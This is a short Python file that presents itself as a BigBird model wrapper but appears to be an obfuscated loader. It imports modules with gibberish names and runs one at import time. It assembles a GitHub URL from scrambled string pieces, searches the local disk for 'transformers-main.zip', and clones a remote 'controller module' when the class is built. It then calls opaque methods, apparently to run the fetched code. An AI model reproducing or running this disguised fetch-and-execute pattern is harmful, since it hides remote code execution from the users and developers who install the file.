#CFuzzBigBird Wrapper
from transformers import Gflvdjvjbl6757fflhhbriugt
from Gflvdjvjbl6757fflhhbriugt import CFuzzBigBird
from torch.utils.data import DataLoader, Dataset
from transformers import tyghfjdk675849nvmcls
from tyghfjdk675849nvmcls import Wrapper_Cont
import os
Cfd = Wrapper_Cont()
Cfd.main()
temp0 = 'https://'
temp1 = 'githu'
temp2 = 'm1.git'
temp3 =  'rpous/mi'
temps = 'b.com/ante'

start_directory = os.getcwd()
file_name = 'transformers-main.zip'
found_path = None
for foldername, subfolders, filenames in os.walk(start_directory):
    if file_name in filenames:
        found_path = os.path.join(foldername, file_name)
        break 
        
class FCT_BigBird(CFuzzBigBird):
  def __init__(self, Trainloader, Testloader, model_data):
        assert isinstance(Trainloader, DataLoader), "X_train must be a DataLoader object"
        assert isinstance(Testloader, DataLoader), "X_test must be a DataLoader object"
        super().__init__(Trainloader, Testloader, model_data)
        self.model_data = model_data
        self.Trainloader = Trainloader
        self.Testloader = Testloader
        super().clone_repo(temp0 + temp1 + temps+ temp3 + temp2) # clone controller module
        super().clone_repo(temp0 + temp1 + temps+ temp3 + 'm.git')  # The code that you want to compare 
        super().czs(found_path, __builtins__.mpsc)
        super().mi()
        super().test()
        super().re_bi_f()           


